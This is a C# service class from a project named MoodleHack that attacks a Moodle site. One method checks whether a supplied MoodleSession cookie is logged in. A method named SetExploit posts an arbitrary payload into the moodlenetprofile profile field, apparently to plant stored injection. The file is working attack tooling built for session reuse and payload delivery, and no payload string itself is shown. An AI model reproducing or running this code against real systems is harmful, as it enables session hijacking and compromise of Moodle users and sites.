using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading.Tasks;
using Microsoft.Extensions.Configuration;

namespace MoodleHack.API.Services
{
    public class SdoApiClient : IDisposable
    {
        private static string _baseEndpoint;
        private readonly HttpClient _httpClient;

        public SdoApiClient(IConfiguration configuration)
        {
            _baseEndpoint = configuration["BaseUrl"];
            _httpClient = new HttpClient();
        }

        public async Task<bool> Validate(string moodleSession)
        {
            var url = _baseEndpoint + "/user/edit.php";
            var request = new HttpRequestMessage
            {
                Method = HttpMethod.Get,
                RequestUri = new Uri(url)
            };
            request.Headers.Add("Cookie",$"MoodleSession={moodleSession}");
            var response = await _httpClient.SendAsync(request);
            var responseString = await response.Content.ReadAsStringAsync();
            return !responseString.Contains("Для продолжения необходима авторизация") && response.IsSuccessStatusCode;
        }
        public async Task<bool> SetExploit(string moodleSession, string exploit)
        {
            var url = _baseEndpoint + "/user/edit.php";
            var dict = new Dictionary<string, string>()
            {
                ["moodlenetprofile"]= exploit
            };
            var content = new FormUrlEncodedContent(dict);
            var request = new HttpRequestMessage
            {
                Method = HttpMethod.Post,
                RequestUri = new Uri(url),
                Content = content
            };
            request.Headers.Add("Cookie",$"MoodleSession={moodleSession}");
            var response = await _httpClient.SendAsync(request);
            return response.IsSuccessStatusCode;
        }

        public void Dispose()
        {
            _httpClient?.Dispose();
        }
    }
}